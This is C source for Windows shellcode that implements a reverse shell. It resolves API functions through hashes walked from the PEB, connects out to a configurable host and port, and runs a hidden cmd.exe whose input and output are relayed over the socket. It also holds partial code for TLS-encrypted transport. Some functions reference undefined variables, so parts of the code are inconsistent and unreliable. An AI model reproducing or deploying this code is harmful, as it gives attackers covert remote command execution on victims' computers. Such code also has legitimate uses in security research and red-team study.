/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "include.h"
  
void c_cmd (sc_cls *x);

/**F*********************************************
 *
 * entrypoint of PIC
 *
 ************************************************/
#ifdef XALONE
void mainCRTStartup(void)
#else
void main(void)
#endif
{
    WSADATA            wsa;
    struct sockaddr_in sin;
    sc_cls             c;
    DWORD              i;
    int                r;
    char               ws2_32[]={'w','s','2','_','3','2','\0'};
    LoadLibrary_t      pLoadLibrary;

    DWORD api_tbl[21] = 
  { // kernel32
    0x9B1D3EA9, 0xE6FA65BF, 0x0BEEEE0C, 0xD7F74F5F,
    0xE0E73F55, 0x5874B33B, 0xB6A0D8D1, 0x09228FC6,
    0xC0F188F0, 0x9FEA6E52, 0xB4682C63,
    // ws2_32
    0x9D920334, 0xB50DF1B2, 0x3DD3116A, 0x3B7B117C,
    0xCE2971AD, 0x424589CE, 0x929726BE, 0x272C063F,
    0x26EF0516, 0xB0E0E991 };

    // load required modules just in case unavailable in PEB
    // get address for LoadlibraryA
    pLoadLibrary=(LoadLibrary_t)MyGetProcAddress(0x7C3B28ED);
    
    // load ws2_32 
    pLoadLibrary(ws2_32);
    
    // resolve our api addresses
    for (i=0; i<sizeof(api_tbl)/sizeof(DWORD); i++) {
      c.m.api[i] = MyGetProcAddress(api_tbl[i]);
    }
    
    // initialize winsock
    c.m.pWSAStartup (MAKEWORD(2, 0), &wsa);
    
    // create tcp socket
    c.p.s = c.m.psocket (AF_INET, 
        SOCK_STREAM, IPPROTO_IP);
        
    // initialize network address, this requires changing before deployment
    sin.sin_port             = HTONS(1234);
    sin.sin_family           = AF_INET;
    sin.sin_addr.S_un.S_addr = 0x0100007F; // 127.0.0.1
    
    // connect to server
    r = c.m.pconnect (c.p.s, 
        (const struct sockaddr*)&sin, sizeof (sin));
    
    if (!r)
    {
      c.p.evt0 = c.m.pWSACreateEvent();
    
      // execute cmd.exe
      c_cmd(&c);

      // close socket event handle
      c.m.pCloseHandle(c.p.evt0);
    }
    // close socket
    c.m.pclosesocket (c.p.s);
}

// resolve host, create socket and event handle
tcp_ctx* tcp_new_ctx (int family, char *host, char *port)
{
    struct addrinfo *list, *e;
    struct addrinfo hints;
    WSADATA         wsa;
    int             on=1;
    tcp_ctx         *c;
    
    WSAStartup (MAKEWORD (2, 0), &wsa);
    
    ZeroMemory (&hints, sizeof (hints));

    hints.ai_family   = family;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    
    // try to resolve network address for host
    if (getaddrinfo (host, port, &hints, &list) != 0) {
      return NULL;
    }
    c = tcp_alloc(sizeof(tcp_ctx));
    
    // traverse list of entries
    for (e=list; e!=NULL; e=e->ai_next) 
    {
      if (family==AF_INET) {
        memcpy (&c->v4, e->ai_addr, e->ai_addrlen);
        c->ai_addr = (SOCKADDR*)&c->v4;        
      } else {
        memcpy (&c->v6, e->ai_addr, e->ai_addrlen);
        c->ai_addr = (SOCKADDR*)&c->v6;
      }
      c->ai_addrlen = e->ai_addrlen;
      // create socket and event for signalling
      c->s = socket (family, SOCK_STREAM, IPPROTO_TCP);
      if (c->s != SOCKET_ERROR) {
        // ensure we can reuse same port later
        setsockopt (
          c->s, SOL_SOCKET, SO_REUSEADDR, 
          (char*)&on, sizeof (on));
      }
      break;
    }
    freeaddrinfo (list);
    return c;
}

// open connection to remote server
int tcp_open(tcp_ctx *c)
{
  if (connect(c->s, c->ai_addr, c->ai_addrlen) != SOCKET_ERROR) 
  {
    return 1;
  }
  return 0;
}

// close connection to remote server
void tcp_close(tcp_ctx *c)
{
    // disable send/receive operations
    shutdown (c->s, SD_BOTH);
    // close socket
    closesocket (c->s);
}

// shut down socket, close event handle, clean up
void tcp_free_ctx (tcp_ctx *c)
{
    // close tcp connection
    tcp_close(c);
    // close event handle
    CloseHandle(c->sck_evt);
    // release memory
    tcp_free(c);
}

// allocate memory
void* tls_alloc (int size) {
    return HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,size);
}

// re-allocate memory
void* tls_realloc (void* mem, int size) {
    return HeapReAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,mem,size);
}

// free memory
void tls_free (void *mem) {
    HeapFree(GetProcessHeap(),0,mem);
}

// load secur32.dll into memory
int tls_load_lib(tls_ctx *c)
{
    INIT_SECURITY_INTERFACE pInitSecurityInterface;
    char secur32[]= { 's', 'e', 'c', 'u', 'r', '3', '2'      }; // > NT4
    char security[]={ 'S', 'e', 'c', 'u', 'r', 'i', 't', 'y' }; // == NT4
    char init[]={'I','n','i','t','S','e','c','u','r','i','t','y','I','n','t','e','r','f','a','c','e','A'};
    
    c->lib = LoadLibrary(secur32);
    if (c->lib == NULL) return 0;

    pInitSecurityInterface = (INIT_SECURITY_INTERFACE)GetProcAddress(c->lib, init);
    if (pInitSecurityInterface == NULL) return 0;
    c->sspi = pInitSecurityInterface();
    
    return (c->sspi != NULL) ? 1 : 0;
}

// create new tls context
tls_ctx* tls_new_ctx(void)
{  
    tls_ctx *c;
    
    c = tls_alloc(sizeof(tls_ctx));
    if (c==NULL) return NULL;
    
    if (!tls_load_lib(c)) {
      tls_free(c);
      return NULL;
    }
    
    if (c->cert==NULL) {
      c->cert=CertOpenSystemStore(0, "MY");
      if (c->cert==NULL) {
        tls_free(c);
        return NULL;
      }
    }  
    return c;
}

// free tls context
void tls_free_ctx(tls_ctx *c)
{
    if (c->cert) {
      CertCloseStore(c->cert, 0);
    }
    FreeLibrary(c->lib);
    tls_free(c);
}

// initialize new tls session
tls_session* tls_new_session(tls_ctx *c)
{
    ALG_ID      algs[2];
    tls_session *s = tls_alloc(sizeof(tls_session));

    if (s == NULL) return NULL;
    
    s->buf    = tls_alloc(TLS_MAX_BUFSIZ);
    s->maxlen = TLS_MAX_BUFSIZ;
    
    if (s->buf == NULL) {
      tls_free(s);
      return NULL;
    }
    
    algs[0]                     = CALG_RSA_KEYX;  
    s->sc.dwVersion             = SCHANNEL_CRED_VERSION;
    s->sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT; 
    s->sc.cSupportedAlgs        = 1;
    s->sc.palgSupportedAlgs     = algs;
    s->sc.dwFlags              |= SCH_CRED_NO_DEFAULT_CREDS;
    s->sc.dwFlags              |= SCH_CRED_MANUAL_CRED_VALIDATION;
    
    c->ss = c->sspi->
      AcquireCredentialsHandleA (
        NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, 
        NULL, &s->sc, NULL, NULL, &s->cc, NULL);
      
    return s;  
}

void tls_free_session(tls_ctx *c, tls_session *s)
{
    // free client credentials
    c->sspi->FreeCredentialsHandle(&s->cc);
    // free sspi context handle
    c->ss = c->sspi->DeleteSecurityContext(&s->ctx);
    // free structure
    tls_free(s->buf);
    tls_free(s);
}

void tls_client(tcp_ctx *tcp, tls_ctx *ctx)
{
    tls_session *tls = tls_new_session(ctx);
    FD_SET      fds;
    int         r;
    
    if (tls != NULL) {
      // open connection to remote host
      if (connect(
        tcp->s, tcp->ai_addr, 
        tcp->ai_addrlen)!=SOCKET_ERROR)
      {
        // set socket descriptor
        tls->sck = tcp->s;
        if (tls_handshake(ctx, tls)) {
          DEBUG_PRINT ("\n  [ connected");
          
          #if defined(DEBUG) && DEBUG > 0 
            tls_info(ctx, tls, TLS_CONNECTION_INFO); 
            tls_info(ctx, tls, TLS_STREAM_SIZE);  
          #endif
          
          tls_cmd(ctx, tls);
        } else {
          DEBUG_PRINT("\n  [ handshake failed"); 
        }
        shutdown(tcp->s, SD_BOTH);
        closesocket(tcp->s);
      } else {
        DEBUG_PRINT("\n  [ connect failed");
      }
      tls_free_session(ctx, tls);    
    }
}

/**F*********************************************
 *
 * send packet, fragmented if required
 *
 ************************************************/
int send_pkt (sc_cls *c, void *buf, int buflen)
{
    int      len, outlen=buflen;  
    uint32_t sum;
    uint8_t  *p=(uint8_t*)buf;
    
    for (sum=0; sum<outlen; sum += len) {
      len=c->m.psend (c->p.s, &p[sum], outlen - sum, 0);
      if (len<=0) return -1;
    }
    return sum;
}

/**

ISC_REQ_ALLOCATE_MEMORY
    The security package allocates output buffers for you. 
    When you have finished using the output buffers, free 
    them by calling the FreeContextBuffer function.
              
ISC_REQ_CONFIDENTIALITY
    Encrypt messages by using the EncryptMessage function.

ISC_REQ_EXTENDED_ERROR
    When errors occur, the remote party will be notified.

ISC_REQ_MANUAL_CRED_VALIDATION - 
    Schannel must not authenticate the server automatically.

ISC_REQ_REPLAY_DETECT - 
    Detect replayed messages that have been encoded by using 
    the EncryptMessage or MakeSignature functions.

ISC_REQ_SEQUENCE_DETECT - 
    Detect messages received out of sequence.

ISC_REQ_STREAM - 
    Support a stream-oriented connection.
              
*/
int tls_hello(sc_cls *c)
{
    DWORD         flags_in, flags_out;
    SecBufferDesc out;
    SecBuffer     ob[1];
    
    flags_in = ISC_REQ_REPLAY_DETECT   |
               ISC_REQ_CONFIDENTIALITY |
               ISC_RET_EXTENDED_ERROR  |
               ISC_REQ_ALLOCATE_MEMORY;
               
    ob[0].pvBuffer   = NULL;
    ob[0].BufferType = SECBUFFER_TOKEN;
    ob[0].cbBuffer   = 0;
    
    out.cBuffers     = 1;
    out.pBuffers     = ob;
    out.ulVersion    = SECBUFFER_VERSION;
    
    // prepare hello message
    c->ss = c->sspi->
      InitializeSecurityContextA(
        &s->cc, NULL, NULL, flags_in, 0,
        SECURITY_NATIVE_DREP, NULL, 0, 
        &s->ctx, &out, &flags_out, &s->ts);
    
    if (c->ss != SEC_I_CONTINUE_NEEDED) return 0;
    
    // if we have data, send it
    if (ob[0].cbBuffer != 0) {
      tls_send(s->sck, ob[0].pvBuffer, ob[0].cbBuffer);
      // free buffer
      c->ss = c->sspi->FreeContextBuffer(ob[0].pvBuffer);
    }
    return c->ss == SEC_E_OK ? 1 : 0;  
}

/**
 *
 * perform tls handshake
 *
 */
int tls_handshake(sc_cls *c)
{
    DWORD         flags_in, flags_out;
    SecBuffer     ib[2], ob[1];
    SecBufferDesc in, out;
    int           len;
    
    // send initial hello
    if (!tls_hello(cls)) {
      return 0;
    }
      
    flags_in = ISC_REQ_REPLAY_DETECT   |
               ISC_REQ_CONFIDENTIALITY |
               ISC_RET_EXTENDED_ERROR  |
               ISC_REQ_ALLOCATE_MEMORY;

    c->ss     = SEC_I_CONTINUE_NEEDED;
    s->buflen = 0;
    
    // keep going until handshake performed
    while (c->ss==SEC_I_CONTINUE_NEEDED || 
           c->ss==SEC_E_INCOMPLETE_MESSAGE ||
           c->ss==SEC_I_INCOMPLETE_CREDENTIALS)
    {
      if (c->ss==SEC_E_INCOMPLETE_MESSAGE)
      {
        // receive data from server
        len = recv(s->sck, &s->buf[s->buflen], 
                s->maxlen - s->buflen, 0);
          
        // socket error?
        if (len < 0) {
          DEBUG_PRINT("socket error");
          c->ss = SEC_E_INTERNAL_ERROR;
          break;
        // server disconnected?  
        } else if (len == 0) {
          DEBUG_PRINT("server disconnected");        
          c->ss = SEC_E_INTERNAL_ERROR;
          break;            
        }
        // increase buffer position
        s->buflen += len;
      }
      
      // inspect what we've received
      //tls_hex_dump(s->buf, s->buflen);
      
      // input data         
      ib[0].pvBuffer   = s->buf;
      ib[0].cbBuffer   = s->buflen;
      ib[0].BufferType = SECBUFFER_TOKEN;
      
      // empty buffer
      ib[1].pvBuffer   = NULL;
      ib[1].cbBuffer   = 0;
      ib[1].BufferType = SECBUFFER_VERSION;
      
      in.cBuffers      = 2;
      in.pBuffers      = ib;
      in.ulVersion     = SECBUFFER_VERSION;
        
      // output from schannel
      ob[0].pvBuffer   = NULL;  
      ob[0].cbBuffer   = 0;  
      ob[0].BufferType = SECBUFFER_VERSION;

      out.cBuffers     = 1;
      out.pBuffers     = ob;
      out.ulVersion    = SECBUFFER_VERSION;
      
      c->ss = c->sspi->
        InitializeSecurityContextA(
        &s->cc, &s->ctx, NULL, flags_in, 0,
        SECURITY_NATIVE_DREP, &in, 0, NULL,
        &out, &flags_out, &s->ts);

      // what have we got so far?  
      if (c->ss == SEC_E_OK || 
          c->ss == SEC_I_CONTINUE_NEEDED ||
          (FAILED(c->ss) && (flags_out & ISC_RET_EXTENDED_ERROR))) 
      {
        // response for server?
        if (ob[0].cbBuffer != 0 && ob[0].pvBuffer) 
        {
          // send response
          tls_send(s->sck, ob[0].pvBuffer, ob[0].cbBuffer);
          // free response
          c->sspi->FreeContextBuffer(ob[0].pvBuffer);
          ob[0].pvBuffer = NULL;
        }
      }
      // incomplete message? continue reading
      if (c->ss == SEC_E_INCOMPLETE_MESSAGE) continue;
      
      // completed handshake?
      if (c->ss == SEC_E_OK)
      {
        // If the "extra" buffer contains data, this is encrypted application
        // protocol layer stuff. It needs to be saved. The application layer
        // will decrypt it later with DecryptMessage.
        if (ib[1].BufferType == SECBUFFER_EXTRA)
        {
          DEBUG_PRINT("\n  [ we have extra data after handshake");        
          memmove(s->pExtra.pvBuffer,
              &s->buf[(s->buflen - ib[1].cbBuffer)], ib[1].cbBuffer);

          s->pExtra.cbBuffer   = ib[1].cbBuffer;
          s->pExtra.BufferType = SECBUFFER_TOKEN;
        }
        else
        {
          // no extra data encountered
          s->pExtra.pvBuffer   = NULL;
          s->pExtra.cbBuffer   = 0;
          s->pExtra.BufferType = SECBUFFER_EMPTY;
        }
        break;
      }
      // some other error
      if(FAILED(c->ss)) break; 

      // Copy any leftover data from the "extra" buffer, and go around again.
      if (ib[1].BufferType == SECBUFFER_EXTRA)
      {
        memmove(s->buf, &s->buf[(s->buflen - ib[1].cbBuffer)], ib[1].cbBuffer);
        s->buflen = ib[1].cbBuffer;
        DEBUG_PRINT("\n  [ we have %i bytes of extra data", s->buflen); 
      } else {
        s->buflen = 0; 
      }
    }
    return c->ss==SEC_E_OK ? 1 : 0;
}

/**
 *
 * encrypt data and send to remote system
 *
 */
int tls_encrypt(sc_cls *c)
{
    SecBufferDesc  msg;
    SecBuffer      sb[4];
    
    // stream header
    sb[0].pvBuffer   = s->buf; 
    sb[0].cbBuffer   = c->sizes.cbHeader; 
    sb[0].BufferType = SECBUFFER_STREAM_HEADER;

    // stream data
    sb[1].pvBuffer   = s->buf + c->sizes.cbHeader;
    sb[1].cbBuffer   = s->buflen; 
    sb[1].BufferType = SECBUFFER_DATA; 
    
    // stream trailer
    sb[2].pvBuffer   = s->buf + 
                       c->sizes.cbHeader + 
                       s->buflen; 
                       
    sb[2].cbBuffer   = c->sizes.cbTrailer; 
    sb[2].BufferType = SECBUFFER_STREAM_TRAILER; 

    // last buffer is empty
    sb[3].pvBuffer   = SECBUFFER_EMPTY; 
    sb[3].cbBuffer   = SECBUFFER_EMPTY; 
    sb[3].BufferType = SECBUFFER_EMPTY;

    msg.ulVersion    = SECBUFFER_VERSION; 
    msg.cBuffers     = 4;
    msg.pBuffers     = sb; 
    
    // encrypt outgoing data
    c->ss = c->sspi->EncryptMessage (&s->ctx, 0, &msg, 0);

    // if encrypted ok, send to remote system
    if (c->ss == SEC_E_OK) {
      // calculate total length
      s->buflen = sb[0].cbBuffer + 
                  sb[1].cbBuffer + 
                  sb[2].cbBuffer;
                  
      tls_send (s->sck, s->buf, s->buflen);
    }
    return c->ss;
}

/**
 *
 * receive and decrypt data from remote system
 *
 */
int tls_decrypt(sc_cls *c)
{
    SecBufferDesc  msg;
    SecBuffer      sb[4];
    SecBuffer      *pData=NULL, *pExtra=NULL;
    int            len, i;

    s->buflen = 0;
    c->ss     = SEC_E_INCOMPLETE_MESSAGE;
    
    // read data from server until we have 
    // decrypted data, server disconnects or session ends
    for (;;)
    {
      // if this is first read or last read was incomplete
      if (s->buflen == 0 || c->ss == SEC_E_INCOMPLETE_MESSAGE)
      {
        // receive some data
        len = c->m.precv (s->sck, 
          &s->buf[s->buflen], s->maxlen - s->buflen, 0);
        
        // was there a socket error?
        if (len < 0) {
          DEBUG_PRINT("\n  [ socket error");
          break;
        }
        // did the server disconnect?
        if (len == 0) {
          DEBUG_PRINT("\n  [ server disconnected");
          // do we have unencrypted data?
          if (s->buflen) {
            DEBUG_PRINT("\n  - it was an error");
            // we were in process of receiving data 
            // before decryption completed
            // so it's probably an error
          } else {
            DEBUG_PRINT("\n  - the session ended");
            // the session ended, we have everything
          }
          break;
        }
        // advance total length of data in buffer
        s->buflen += len;
      }
      // try decrypt data we have so far
      sb[0].pvBuffer   = s->buf;
      sb[0].cbBuffer   = s->buflen;
      
      sb[0].BufferType = SECBUFFER_DATA;
      sb[1].BufferType = SECBUFFER_EMPTY;
      sb[2].BufferType = SECBUFFER_EMPTY;
      sb[3].BufferType = SECBUFFER_EMPTY;

      msg.ulVersion    = SECBUFFER_VERSION;
      msg.cBuffers     = 4;
      msg.pBuffers     = sb;
      
      c->ss = c->sspi->DecryptMessage(&s->ctx, &msg, 0, NULL);
      
      // end of session?
      if (c->ss == SEC_I_CONTEXT_EXPIRED) {
        DEBUG_PRINT("\n  [ context expired");
        break;
      }
      
      // decryption succeeded
      if (c->ss == SEC_E_OK)
      {      
        // locate data and (optional) extra data      
        for (i=0; i<4; i++) {
          // data?
          if (pData == NULL && 
              sb[i].BufferType == SECBUFFER_DATA) { 
            pData  = &sb[i];
          }
        
          // extra?
          if (pExtra == NULL && 
              sb[i].BufferType == SECBUFFER_EXTRA) {
            pExtra = &sb[i];
          }
        }
        // if we have data
        if (pData != NULL)
        {
          // save the length
          s->buflen = pData->cbBuffer;
          if (s->buflen != 0)
          {
            // save the data
            memmove (s->buf, pData->pvBuffer, s->buflen);
            break;
          }
        }    
      }
      // doesn't handle SEC_I_RENEGOTIATE
      // doesn't handle any extra data
    } // end for
    #if defined(DEBUG) && DEBUG > 0
    tls_hex_dump(s->buf, s->buflen);
    #endif
    return SEC_E_OK;
}

DWORD MyGetLastError(VOID)
{
#ifdef _WIN64  
    return (DWORD)__readgsqword(0x68);
#else
    return (DWORD)__readfsdword(0x34);
#endif  
}

DWORD MyGetTickCount(VOID)
{
#ifdef _WIN64  
    ULONGLONG tick = *(ULONGLONG*)0x7FFE0320;
    ULONG     mul  = *(DWORD*)0x7FFE0004;
    
    return (tick * mul) >> 24;
#else
    ULONG     lo, hi, mul;
    ULONGLONG x;
    
    mul = *(ULONG*)0x7FFE0004;
    lo  = *(ULONG*)0x7FFE0320;
    hi  = *(ULONG*)0x7FFE0324;  
    
    x = ((ULONGLONG)(mul)) * lo;  
    return ((hi << 8) * mul) + (x >> 24);
#endif  
}

/**F*********************************************
 *
 * Wait for events from multiple sources
 *
 ************************************************/
DWORD wait_evt (sc_cls *c, cmd_session *cs)
{
    WSANETWORKEVENTS ne;
    u_long           opt;
    DWORD            e;
    
    // set to non-blocking mode.
    // monitor TCP read/close events
    c->m.pWSAEventSelect (c->p.s, cs->evt0, 
        FD_CLOSE | FD_READ);
      
    // wait for multiple events to trigger
    e=c->m.pWaitForMultipleObjects (c->p.evt_cnt, 
        &cs->evt0, FALSE, INFINITE);
    
    // enumerate events for socket
    c->m.pWSAEnumNetworkEvents (c->p.s, cs->evt0, &ne);
    
    DEBUG_PRINT("received %08lX", ne.lNetworkEvents);
    
    // clear monitor
    c->m.pWSAEventSelect (c->p.s, cs->evt0, 0);
    
    // set socket to blocking mode
    opt=0;
    c->m.pioctlsocket (c->p.s, FIONBIO, &opt);
    
    // closed?
    if (ne.lNetworkEvents & FD_CLOSE) {
      e = ~0UL;
    }
    return e;
}

/**F*********************************************
 *
 * Main loop for cmd.exe
 *
 * Writes input from server to stdin
 * Reads output from stdout and sends to server
 *
 ************************************************/
void cmd_loop(sc_cls *c, cmd_session *cs)
{
    DWORD      e, p=0;
    OVERLAPPED lap;

    memset((uint8_t*)&lap, 0, sizeof(lap));

    c->p.evt_cnt=3;
    
    // assign event handle for stdout  
    lap.hEvent=c->p.evt1;
    
    for (;;)
    {
      e = wait_evt(c, cs);
      
      // socket event?
      if (e == 0) 
      {
        DEBUG_PRINT("socket event");
        // receive data
        spp_recv(c);
        
        if (c->p.blk.len.w <= 0) {
          DEBUG_PRINT("spp_recv() failed");
          break;
        }
        
        DEBUG_PRINT("Writing %i bytes %s to stdin", 
            c->p.blk.len.w, c->p.blk.data.b);
        
        // write to stdin
        c->m.pWriteFile (c->p.in0, c->p.blk.data.b, 
            c->p.blk.len.w, (PDWORD)&c->p.blk.len.w, 0);         
      } else
     
      // stdout/stderr of cmd.exe?
      if (e == 1) 
      {
        DEBUG_PRINT("Reading from stdout");
        // no read pending
        if (p == 0)
        {
          c->m.pReadFile (c->p.out1, c->p.blk.data.b, 
              SPP_BLK_LEN, (PDWORD)&c->p.blk.len.w, &lap);
          p++;
        } else {
          if (!c->m.pGetOverlappedResult (c->p.out1, 
              &lap, (PDWORD)&c->p.blk.len.w, FALSE)) 
          {
            break;
          }
        }
        if (c->p.blk.len.w != 0)
        {
          spp_send(c);
          if (c->p.blk.len.w<=0) {
            DEBUG_PRINT("spp_send() failed");
            break;
          }
          p--;
        }
      } else {
        // either the socket closed or cmd.exe ended
        DEBUG_PRINT("socket closed or cmd.exe terminated");
        break;
      }
    }
    c->p.evt_cnt=1;
}

/**F*********************************************
 *
 * Spawn cmd.exe for server
 *
 ************************************************/
void tls_cmd (sc_cls *c)
{
    SECURITY_ATTRIBUTES sa;
    STARTUPINFO         si;
    DWORD               i, t;
    char                pname[32];
    cmd_session         cs;
 
    char pipe[] =
      { '\\','\\','.','\\','p','i','p','e','\\'};
    
    char cmd[] =
      { 'c','m','d','\0' };

    memcpy (pname, pipe, 9);
    
    // set last 8 bytes to something "unique"
    // which avoids issues with duplicate pipe names
    t = MyGetTickCount();
    
    for (i=0; i<8; i++) {
      pname[9+i] = (t % 26) + 'a';
      t >>= 2;
    }
    pname[9+i] = 0;
    
    // initialize security descriptor
    sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle       = TRUE;
    
    // create named pipe for stdout + stderr of cmd.exe
    DEBUG_PRINT("Creating named pipe %s", pname);

    cs.out1 = c->m.pCreateNamedPipe (pname, 
        PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE, 1, 0, 0, 0, &sa);
          
    if (cs.out1 != INVALID_HANDLE_VALUE)
    {
      // create anonymous pipe for reading stdin of cmd.exe
      if (c->m.pCreatePipe (&cs.in1, &cs.in0, &sa, 0))
      {
        DEBUG_PRINT("Opening named pipe %s", pname);
        // open named pipe for write access
        cs.out0 = c->m.pCreateFile (pname, GENERIC_WRITE, 
            0, &sa, OPEN_EXISTING, 0, NULL);
            
        if (cs.out0 != INVALID_HANDLE_VALUE)
        {
          // create event for stdout events
          cs.evt1 = c->m.pCreateEvent (NULL, 
              TRUE, TRUE, NULL);
    
          // zero initialize STARTUPINFO
          memset((uint8_t*)&si, 0, sizeof(si));
          
          si.cb         = sizeof (si);
          // assign read handle of anonymous pipe
          si.hStdInput  = cs.in1;     
          // assign write handle of named pipe to stdout/stderr
          si.hStdError  = cs.out0;    
          si.hStdOutput = cs.out0;
          si.dwFlags    = STARTF_USESTDHANDLES;
          
          // execute cmd.exe without visible window
          DEBUG_PRINT("Creating cmd.exe");
          
          if (c->m.pCreateProcess (NULL, cmd, NULL, NULL, TRUE, 
              CREATE_NO_WINDOW, NULL, NULL, &si, &cs.pi))
          {
            // enter main loop
            cmd_loop(c, &cs);
            // just incase socket closed, terminate cmd.exe
            c->m.pTerminateProcess (cs.pi.hProcess, 0);
            // close handles
            c->m.pCloseHandle(cs.pi.hThread);
            c->m.pCloseHandle(cs.pi.hProcess);
          } else {
            DEBUG_PRINT("CreateProcess() %i", MyGetLastError());
          }
          // close event for stdout of cmd.exe
          c->m.pCloseHandle(cs.evt1);
          // close named pipe handle
          c->m.pCloseHandle(cs.out0);
        }
        // close anon pipes
        c->m.pCloseHandle(cs.in0);
        c->m.pCloseHandle(cs.in1);
      }
      // close named pipe
      c->m.pCloseHandle(cs.out1);
    }
}

DWORD api_hash(uint8_t str[])
{
    DWORD h = 0;
    
    while (*str) {
      h = ROTR32(h, 13);
      h += (*str | 0x20);
      str++;
    }
    return h;
}

/**F*********************************************
 *
 * Obtain address of API from PEB based on hash
 *
 ************************************************/
FARPROC MyGetProcAddress(DWORD dwHash)
{
    PPEB                     peb;
    PPEB_LDR_DATA            ldr;
    PLDR_DATA_TABLE_ENTRY    dte;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PVOID                    base;
    DWORD                    cnt=0, ofs=0, i, j;
    DWORD                    idx, rva, api_h, dll_h;
    PIMAGE_DATA_DIRECTORY    dir;
    PIMAGE_EXPORT_DIRECTORY  exp;
    PDWORD                   adr;
    PDWORD                   sym;
    PWORD                    ord;
    PCHAR                    api, dll, p;
    LPVOID                   api_adr=0;
    CHAR                     dll_name[64], api_name[128];
    
    #if defined(_WIN64)
      peb = (PPEB) __readgsqword(0x60);
    #else
      peb = (PPEB) __readfsdword(0x30);
    #endif

    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL && api_adr == NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {
      base = dte->DllBase;
      dos  = (PIMAGE_DOS_HEADER)base;
      nt   = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
      dir  = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
      rva  = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
      
      // if no export table, continue
      if (rva==0) continue;
      
      exp = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, base, rva);
      cnt = exp->NumberOfNames;
      
      // if no api, continue
      if (cnt==0) continue;
      
      adr = RVA2VA(PDWORD,base, exp->AddressOfFunctions);
      sym = RVA2VA(PDWORD,base, exp->AddressOfNames);
      ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
      dll = RVA2VA(PCHAR, base, exp->Name);
      
      // calculate hash of DLL string
      dll_h = api_hash(dll);
      
      do {
        // calculate hash of api string
        api = RVA2VA(PCHAR, base, sym[cnt-1]);
        // add to DLL hash and compare
        if (api_hash(api)+dll_h == dwHash) {
          // return address of function
          api_adr=RVA2VA(LPVOID, base, adr[ord[cnt-1]]);
          break;
        }
      } while (--cnt && api_adr==0);
    }
    return api_adr;
}

